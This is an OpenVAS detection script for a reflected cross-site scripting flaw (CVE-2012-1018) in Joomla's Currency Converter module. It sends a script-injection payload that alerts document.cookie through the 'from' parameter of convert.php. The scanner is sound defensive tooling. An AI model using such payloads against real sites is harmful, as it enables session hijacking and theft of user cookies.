##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_mod_currencyconverter_xss_vuln.nasl 11549 2018-09-22 12:11:10Z cfischer $
#
# Joomla! Currency Converter Module 'from' Parameter Cross-Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802588");
  script_version("$Revision: 11549 $");
  script_cve_id("CVE-2012-1018");
  script_bugtraq_id(51804);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-22 14:11:10 +0200 (Sat, 22 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-02-09 12:55:09 +0530 (Thu, 09 Feb 2012)");

  script_name("Joomla! Currency Converter Module 'from' Parameter Cross-Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72917");
  script_xref(name:"URL", value:"http://dl.packetstormsecurity.net/1202-exploits/joomlacurrencyconverter-xss.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Joomla! Currency Converter Module version 1.0.0");

  script_tag(name:"insight", value:"The flaw is due to an input passed via 'from' parameter to
'/includes/convert.php' is not properly sanitised before being returned to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Joomla with Currency Converter module and is prone to
cross-site scripting vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/modules/mod_currencyconverter/includes/convert.php?from="><script>alert(document.cookie)</script>';

if (http_vuln_check(port: port, url: url, pattern:"><script>alert\(document.cookie\)</script>",
                    check_header:TRUE)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
